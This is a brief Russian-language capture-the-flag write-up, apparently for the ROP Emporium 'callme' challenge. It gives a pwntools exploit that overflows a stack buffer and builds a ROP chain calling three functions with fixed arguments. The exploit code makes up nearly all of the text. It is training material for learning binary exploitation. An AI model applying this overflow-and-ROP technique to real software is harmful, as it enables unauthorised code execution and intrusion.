Необходимо переполнить буфер и переписать адрес возврата на ROP-цепочку, в которой по очереди вызываются функции `callme_one`, `callme_two`, `callme_three` с параметрами `0xDEADBEEFDEADBEEF`, `0xCAFEBABECAFEBABE`, `0xD00DF00DD00DF00D`.

Эксплоит:
``` python
pop_rdi_pop_rsi_pop_rdx = 0x40093c
callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006F0

io = start()

payload = b'A' * (32 + 8)
payload += p64(pop_rdi_pop_rsi_pop_rdx) + p64(0xDEADBEEFDEADBEEF) + p64(0xCAFEBABECAFEBABE) + p64(0xD00DF00DD00DF00D) + p64(callme_one)
payload += p64(pop_rdi_pop_rsi_pop_rdx) + p64(0xDEADBEEFDEADBEEF) + p64(0xCAFEBABECAFEBABE) + p64(0xD00DF00DD00DF00D) + p64(callme_two)
payload += p64(pop_rdi_pop_rsi_pop_rdx) + p64(0xDEADBEEFDEADBEEF) + p64(0xCAFEBABECAFEBABE) + p64(0xD00DF00DD00DF00D) + p64(callme_three)
io.sendline(payload)

io.interactive()
```
